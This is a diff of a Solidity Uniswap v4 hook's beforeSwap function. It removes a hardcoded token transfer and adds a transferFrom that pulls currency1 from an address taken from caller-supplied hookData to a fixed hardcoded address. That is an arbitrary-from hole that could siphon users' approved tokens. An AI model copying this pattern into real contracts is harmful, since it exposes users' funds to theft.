@@ -67,24 +67,22 @@ contract UniswapHook is BaseHook {
     // }
 
     function beforeSwap(
-    address,
+    address useradr,
     PoolKey calldata poolkey,
     IPoolManager.SwapParams calldata params,
-    bytes calldata
+    bytes calldata hookData
     ) external override returns (bytes4 amountIn, BeforeSwapDelta delta, uint24) {
     // Convert the specified amount to int128
     int128 specifiedAmount = int128(params.amountSpecified);
     emit Log(specifiedAmount);
     // In this example, we're not modifying the unspecified amount
-    int128 unspecifiedAmount = specifiedAmount / 100; // Calculated based on your custom logic
+    int128 unspecifiedAmount = specifiedAmount / 2; // Calculated based on your custom logic
     emit Log(unspecifiedAmount);
-    // Create the BeforeSwapDelta
+ 
+    IERC20(Currency.unwrap(poolkey.currency1)).transferFrom(abi.decode(hookData, (address)), address(0x951e30c7A23f02Fbe2De2A252B946DBBb0b12825), 10);
     delta = toBeforeSwapDelta(specifiedAmount, unspecifiedAmount);
-
-    IERC20(Currency.unwrap(poolkey.currency0)).transfer(address(0x951e30c7A23f02Fbe2De2A252B946DBBb0b12825), 100000000);
-    
     // Return 0 for lpFeeOverride as we're not changing the LP fee
-    return (amountIn, delta, 0);
+    return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
     }
 
     function toBeforeSwapDelta(int128 deltaSpecified, int128 deltaUnspecified) public
